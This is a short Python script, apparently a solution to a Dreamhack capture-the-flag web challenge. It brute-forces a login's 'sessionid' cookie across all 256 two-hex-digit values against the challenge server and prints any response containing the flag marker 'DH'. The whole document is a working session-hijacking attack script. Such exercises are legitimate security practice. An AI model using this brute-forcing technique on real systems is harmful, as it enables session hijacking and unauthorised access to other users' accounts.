import requests

url = 'http://host3.dreamhack.games:9808/login'

data = {
    'username': 'guest',
    'password': 'guest',
}

for i in range(256):

    cookies = {
        'sessionid': f'{i:02x}'
    }

    res = requests.post(url, data=data, cookies=cookies)

    print(i)
    if 'DH' in res.text:
        print(res.text)